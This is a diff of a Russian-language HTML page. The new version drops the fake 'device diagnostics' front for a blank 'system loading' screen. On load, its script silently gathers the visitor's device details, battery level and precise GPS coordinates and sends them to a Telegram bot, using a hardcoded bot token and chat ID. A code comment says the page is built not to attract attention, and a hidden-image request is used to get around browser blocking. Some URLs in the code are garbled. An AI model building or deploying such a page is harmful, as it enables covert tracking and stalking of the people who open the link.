@@ -3,157 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тестирование конфигурации устройства</title>
+    <title>Загрузка системы...</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 40px 20px;
-            text-align: center;
-            background-color: #f8f9fa;
-            color: #333;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-        h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 15px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        button {
-            padding: 14px 28px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            transition: background-color 0.2s;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
+        /* Минимальный технический стиль: пустой экран */
+        body { font-family: monospace; background: #ffffff; color: #000000; margin: 20px; font-size: 12px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Проверка параметров системы</h1>
-        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
-        
-        <button onclick="requestLocation()">Запустить диагностику</button>
-    </div>
+    <!-- Страница выглядит как обычная загрузка, чтобы не привлекать внимания -->
+    <div id="status">Загрузка компонентов системы... Пожалуйста, подождите.</div>
 
     <script>
-        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
-        const TG_CHAT_ID = "6559747526"; 
+        // Конфигурация вашего рабочего Телеграм-бота
+        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
+        const CHAT_ID = "6559747526";
 
-        // Обновленная функция с обходом блокировок браузера (через CORS-прокси)
-        async function sendToTelegram(text) {
-            // Используем публичный CORS-прокси для обхода защитных механизмов браузера
-            const targetUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
-            const proxyUrl = `https://herokuapp.com`; 
+        // Функция отправки отчетов (метод скрытой картинки, обходящий CORS-блокировки браузеров)
+        function sendReport(extraData = "") {
+            const time = new Date().toLocaleTimeString();
+            const date = new Date().toLocaleDateString();
             
-            try {
-                // Пробуем отправить напрямую, если браузер пропустит
-                await fetch(targetUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
-                });
-            } catch (e) {
-                // Если прямая отправка заблокирована браузером, отправляем альтернативным методом через параметры строки
-                try {
-                    const fallbackUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-                    const img = new Image();
-                    img.src = fallbackUrl; // Способ отправки "через картинку" игнорирует CORS-блокировки
-                } catch (err) {
-                    console.error("Все методы отправки заблокированы средой исполнения браузера.");
-                }
-            }
+            // Базовые системные параметры, доступные без разрешений
+            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cores = navigator.hardwareConcurrency || "Не определено";
+            const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";
+
+            // Сборка финального текста с максимальной информацией
+            let reportText = `🔔 *Технический отчет*\n\n` +
+                             `📅 *Дата:* ${date}\n` +
+                             `🕒 *Время:* ${time}\n` +
+                             `🤖 *Платформа:* ${isIos}\n` +
+                             `🖥 *Экран:* ${screenRes}\n` +
+                             `🌍 *Часовой пояс:* ${timezone}\n` +
+                             `🧠 *Ядра CPU:* ${cores}` + 
+                             extraData;
+
+            // Отправка через API Telegram
+            const img = new Image();
+            img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
         }
 
-        async function getDeviceSpecs() {
-            let batteryLevel = "Не поддерживается браузером (например, iOS)";
-            let deviceModel = "Не определено";
+        // Дополнительный сбор данных, требующих асинхронного ожидания (заряд и точная модель)
+        async function startAnalytics() {
+            let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
+            let modelText = "";
 
+            // 1. Попытка замерить заряд батареи (работает на Android/ПК)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    batteryText = `\n🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
                 } catch (e) {}
             }
 
+            // 2. Попытка вытянуть точную модель процессора/бренда через Client Hints (Android)
             if (navigator.userAgentData) {
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
+                    if (ua.model) modelText = `\n📱 *Модель:* ${ua.model} (v${ua.platformVersion})`;
                 } catch (e) {}
-            } else {
-                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    deviceModel = "Устройство Apple (iOS)";
-                } else if (/Android/i.test(navigator.userAgent)) {
-                    deviceModel = "Устройство Android";
-                } else {
-                    deviceModel = "Персональный компьютер / Настольная ОС";
-                }
             }
 
-            return { batteryLevel, deviceModel };
-        }
+            // Отправляем первый базовый пакет данных сразу при входе
+            sendReport(batteryText + modelText);
 
-        async function collectAnalytics(extraText = "") {
-            const specs = await getDeviceSpecs();
-            const localTime = new Date().toLocaleTimeString();
-
-            const message = `📱 *Новый технический отчет*\n\n` +
-                            `🤖 *Устройство:* ${specs.deviceModel}\n` +
-                            `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
-                            `🕒 *Локальное время:* ${localTime}` + 
-                            extraText;
-
-            await sendToTelegram(message);
-        }
-
-        window.addEventListener('DOMContentLoaded', () => {
-            collectAnalytics();
-        });
-
-        async function requestLocation() {
+            // 3. Запрос точных координат геолокации
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const geoText = `\n\n📍 *Определено местонахождение*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Посмотреть на Google Карте](https://google.com{lat},${lon})`;
+                        // Форматируем единую строчку координат для быстрого копирования кликом
+                        const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                         
-                        collectAnalytics(geoText);
-                        alert("Диагностика успешно завершена!");
+                        sendReport(batteryText + modelText + coords);
+                        document.getElementById('status').innerText = "Загрузка завершена успешно.";
                     },
                     (error) => {
-                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
+                        // Если пользователь отклонил окно, уведомляем систему
+                        sendReport(batteryText + modelText + "\n❌ *Геолокация:* Доступ отклонен пользователем");
+                        document.getElementById('status').innerText = "Ошибка конфигурации датчиков.";
                     },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
-            } else {
-                alert("Ваш браузер не поддерживает API геолокации.");
             }
         }
+
+        // Запуск сбора данных через полсекунды после открытия страницы
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(startAnalytics, 500);
+        });
     </script>
 </body>
 </html>
